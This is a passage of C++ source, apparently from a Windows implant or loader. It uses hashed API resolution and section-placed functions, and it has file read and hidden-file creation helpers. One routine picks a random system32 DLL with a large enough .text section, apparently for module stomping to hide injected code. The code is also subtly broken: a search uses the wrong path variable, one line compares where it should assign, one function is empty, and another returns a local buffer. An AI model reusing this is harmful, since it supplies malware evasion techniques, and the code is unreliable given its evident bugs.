                VkMem::Copy( RndString, &Words[Count] , sizeof( Words[Count] ) + i );
            }

            return RndString;
        }
    }

    namespace File {

        D_SEC( B ) BOOL Read( PSTR FilePath, PBYTE *FileBuffer, PULONG FileSize ) {
            
            BOOL   bSuccess   = FALSE;
            HANDLE FileHandle = NULL;
            ULONG  BytesRead  = 0;

            FileHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateFileA" ), FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
            if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) return FALSE;

            C_DEF32( FileSize ) = VkCall<ULONG>( XprKernel32, XPR( "GetFileSize" ), FileHandle, 0 );

            *FileBuffer = B_PTR( VkMem::Heap::Alloc( C_DEF32( FileSize ) ) );

            bSuccess = VkCall<BOOL>( XprKernel32, XPR( "ReadFile" ), FileHandle, *FileBuffer, C_DEF32( FileSize ), &BytesRead, NULL );

            VkCall<BOOL>( XprNtdll, XPR( "NtClose" ), FileHandle );

            return bSuccess;
        }

        D_SEC( B ) BOOL Create( PSTR FilePath, PBYTE BufferToWrite, ULONG BufferSize, BOOL Directory, BOOL Temporary, BOOL Hidden ) {
            
            HANDLE FileHandle = NULL;
            ULONG  Flags      = 0;
            ULONG  BytesWttn  = 0;
            BOOL   bSuccess   = FALSE;

            if ( Temporary ) Flags |= FILE_ATTRIBUTE_TEMPORARY;
            if ( Hidden    ) Flags |= FILE_ATTRIBUTE_HIDDEN;
            if ( Directory ) Flags |= FILE_ATTRIBUTE_DIRECTORY | FILE_FLAG_BACKUP_SEMANTICS;

            FileHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateFileA" ), FilePath, GENERIC_WRITE | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, Flags, NULL );
            if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) return FALSE;

            if ( !Directory ) {
                bSuccess = VkCall<BOOL>( XprKernel32, XPR( "WriteFile" ) ,FileHandle, BufferToWrite, BufferSize, &BytesWttn, NULL );
                if ( !bSuccess ) return FALSE;
            }            

            return TRUE;
        }
    }

    namespace Module {

        D_SEC( B ) BOOL Enum( HANDLE ProcessHandle ) {
            
        }

        D_SEC( B ) PSTR GetRnd( SIZE_T SizeToCmp, PBOOL SmallerFull, PBOOL SmallerText ) {
            BOOL    bSuccess           = FALSE;
            HANDLE  FindHandle         = NULL;
            HANDLE  FileHandle         = NULL;
            PBYTE   FileBuffer         = NULL;
            ULONG   FileSize           = 0;
            ULONG   IndexMatch         = ( Random32() % 3500 );
            ULONG   IndexStart         = 0;
            PULONG  BytesRead          = 0;
            CHAR    FilePath[MAX_PATH] = { 0 };
            CHAR    DllDir[26]         = "c:\\windows\\system32\\*.dll";

            WIN32_FIND_DATAA      FindData  = { 0 };
            PIMAGE_NT_HEADERS     ImgNtHdrs = { 0 };
            PIMAGE_SECTION_HEADER SecHeader = { 0 };

            FindHandle = VkCall<HANDLE>( XprKernel32, XPR( "FindFirstFileA" ), FilePath, &FindData );

            do {
                if ( IndexMatch == IndexStart ) {
                    VkStr::ConcatA( FilePath, "c:\\windows\\system32\\" );
                    VkStr::ConcatA( FilePath, FindData.cFileName );

                    FileHandle = VkCall<HANDLE>( XprKernel32, XPR( "CreateFileA" ), FilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL );
                    if ( !FileHandle || FileHandle == INVALID_HANDLE_VALUE ) goto _VK_END;

                    FileSize = VkCall<ULONG>( XprKernel32, XPR( "GetFileSize" ), FileHandle, 0 );
                    if ( !FileSize ) goto _VK_END;

                    FileBuffer = B_PTR( VkMem::Heap::Alloc( FileSize ) );
                    if ( !FileBuffer ) goto _VK_END;

                    bSuccess = VkCall<BOOL>( XprKernel32, XPR( "ReadFile" ), FileHandle, FileBuffer, FileSize, BytesRead, NULL );
                    if ( !bSuccess ) goto _VK_END;

                    ImgNtHdrs = (PIMAGE_NT_HEADERS)( FileBuffer + ( (PIMAGE_DOS_HEADER)FileBuffer )->e_lfanew );
                    SecHeader = IMAGE_FIRST_SECTION( ImgNtHdrs );

                    if ( FileSize >= SizeToCmp ) C_DEF08( SmallerFull ) = TRUE;

                    for ( INT i = 0; i < ImgNtHdrs->FileHeader.NumberOfSections; i++ ) {
                        if ( XPR( A_PTR( SecHeader[i].Name ) ) == XPR( ".text" ) ) {
                            if ( SecHeader[i].SizeOfRawData >= SizeToCmp ) C_DEF08( SmallerText ) == TRUE; break;
                        }
                    }

                    if ( SmallerFull || SmallerText ) {
                        break;
                    } else {
                        VkMem::Heap::Free( FileBuffer, FileSize );
                    }
                }

                IndexStart++;
            } while( VkCall<BOOL>( XprKernel32, XPR( "FindNextFileA" ), FindHandle, &FindData ) );

        _VK_END:
            if ( FindHandle ) VkCall<BOOL>( XprKernel32, XPR( "FindClose" ), FindHandle );
            if ( FileHandle ) VkCall<BOOL>( XprKernel32, XPR( "NtClose" ), FileHandle );
            if ( FileBuffer ) VkMem::Heap::Free( FileBuffer, FileSize );
            return FilePath;
        }
    }

}
